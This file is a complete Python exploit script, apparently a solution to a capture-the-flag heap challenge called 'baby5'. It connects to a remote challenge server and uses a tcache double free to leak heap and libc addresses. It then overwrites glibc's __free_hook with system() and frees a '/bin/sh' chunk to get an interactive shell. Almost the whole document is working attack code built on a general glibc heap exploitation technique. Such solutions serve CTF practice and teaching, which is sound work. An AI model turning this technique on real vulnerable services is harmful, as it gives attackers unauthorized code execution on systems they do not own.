#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './baby5'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'baby-01.pwn.beer', 'port':10005})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    b5 = Baby5(conn)

    b5.add(0x418, 'a'*8)    # 0
    b5.add(0x18, 'b'*8)     # 1
    b5.delete(1)
    b5.delete(1)
    addr_heap_base = u(b5.show(1)) - 0x680
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    b5.delete(0)
    addr_libc_mainarena = u(b5.show(0)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    b5.edit(1, 8, p64(addr_libc_free_hook))
    b5.add(0x18, '/bin/sh\x00')             # 2
    b5.add(0x18, p64(addr_libc_system))     # 3

    b5.delete(2)
    
class Baby5:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, size, data):
        self.sendlineafter('> ', '1')
        self.sendlineafter('size: ', str(size))
        self.sendafter('data: ', data)

    def edit(self, item, size, data):
        self.sendlineafter('> ', '2')
        self.sendlineafter('item: ', str(item))
        self.sendlineafter('size: ', str(size))
        self.sendafter('data: ', data)

    def delete(self, item):
        self.sendlineafter('> ', '3')
        self.sendlineafter('item: ', str(item))

    def show(self, item):
        self.sendlineafter('> ', '4')
        self.sendlineafter('item: ', str(item))
        self.recvuntil('data: ')
        return self.recvuntil('\n\x1b[1;1', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
